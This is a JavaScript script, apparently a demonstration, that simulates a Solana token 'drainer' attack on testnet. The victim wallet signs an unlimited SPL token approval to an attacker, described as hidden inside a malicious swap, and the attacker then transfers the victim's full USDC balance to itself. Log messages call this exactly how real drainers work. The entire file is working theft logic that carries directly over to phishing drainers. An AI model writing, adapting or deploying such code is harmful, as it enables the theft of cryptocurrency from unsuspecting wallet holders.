// SOLANA TESTNET DRAINER BOT - ACTUAL DRAIN SIMULATION
const solanaWeb3 = require('@solana/web3.js');
const splToken = require('@solana/spl-token');
const fs = require('fs');

const NETWORK = 'https://api.testnet.solana.com';
const connection = new solanaWeb3.Connection(NETWORK, 'confirmed');

async function main() {
    console.log('💀 DRAINER BOT - SIMULATING THEFT');
    console.log('===================================\n');
    
    // Load wallets
    if (!fs.existsSync('attacker-wallet.json') || !fs.existsSync('victim-wallet.json')) {
        console.log('❌ Run create-token.js first!');
        return;
    }
    
    const attackerSecret = JSON.parse(fs.readFileSync('attacker-wallet.json'));
    const victimSecret = JSON.parse(fs.readFileSync('victim-wallet.json'));
    
    const attackerWallet = solanaWeb3.Keypair.fromSecretKey(Uint8Array.from(attackerSecret));
    const victimWallet = solanaWeb3.Keypair.fromSecretKey(Uint8Array.from(victimSecret));
    
    console.log('💰 Attacker wallet:', attackerWallet.publicKey.toString());
    console.log('👤 Victim wallet:', victimWallet.publicKey.toString());
    
    // Get USDC mint
    const usdcMint = new solanaWeb3.PublicKey('Gh9ZwEmdLJ8DscKNTkTqPbNwLNNBjuSzaG9Vp2KGtKJr');
    
    // Get victim's USDC account
    const victimUsdcAccount = await splToken.getOrCreateAssociatedTokenAccount(
        connection,
        attackerWallet, // Using attacker to pay fees
        usdcMint,
        victimWallet.publicKey
    );
    
    // Create attacker's USDC account (where stolen funds go)
    const attackerUsdcAccount = await splToken.getOrCreateAssociatedTokenAccount(
        connection,
        attackerWallet,
        usdcMint,
        attackerWallet.publicKey
    );
    
    console.log('\n📊 Victim USDC balance:', (await connection.getTokenAccountBalance(victimUsdcAccount.address)).value.uiAmount);
    
    // STEP 1: Simulate victim unknowingly granting approval
    console.log('\n🔐 STEP 1: Victim unknowingly grants approval (hidden in swap)');
    console.log('    (In real attack, this happens when they swap the malicious token)');
    
    await splToken.approve(
        connection,
        victimWallet, // Victim signs (unknowingly)
        victimUsdcAccount.address,
        attackerWallet.publicKey, // Approving ATTACKER to spend
        victimWallet.publicKey,
        Number.MAX_SAFE_INTEGER // Unlimited approval
    );
    
    console.log('✅ Unlimited approval granted to attacker!');
    
    // STEP 2: Attacker drains using approval
    console.log('\n💸 STEP 2: Attacker drains victim\'s USDC');
    console.log('    (No victim signature needed - approval already granted)');
    
    // Get victim's USDC balance
    const victimBalance = await connection.getTokenAccountBalance(victimUsdcAccount.address);
    
    if (victimBalance.value.uiAmount > 0) {
        const txid = await splToken.transfer(
            connection,
            attackerWallet, // Attacker initiates transfer
            victimUsdcAccount.address,
            attackerUsdcAccount.address,
            attackerWallet.publicKey, // Using delegated authority
            victimBalance.value.amount // Transfer entire balance
        );
        
        console.log(`✅ Drained ${victimBalance.value.uiAmount} USDC to attacker!`);
        console.log(`🔗 Transaction: https://explorer.solana.com/tx/${txid}?cluster=testnet`);
    } else {
        console.log('❌ Victim has no USDC to drain');
    }
    
    // STEP 3: Show final balances
    console.log('\n📊 FINAL BALANCES:');
    const finalVictimBalance = await connection.getTokenAccountBalance(victimUsdcAccount.address);
    const finalAttackerBalance = await connection.getTokenAccountBalance(attackerUsdcAccount.address);
    
    console.log(`Victim USDC: ${finalVictimBalance.value.uiAmount}`);
    console.log(`Attacker USDC: ${finalAttackerBalance.value.uiAmount}`);
    
    console.log('\n🎯 ATTACK COMPLETE!');
    console.log('This is exactly how real drainers work:');
    console.log('1. User approves once (thinks it\'s a swap)');
    console.log('2. Attacker drains all funds later');
    console.log('3. User never sees it coming');
}

main().catch(console.error);
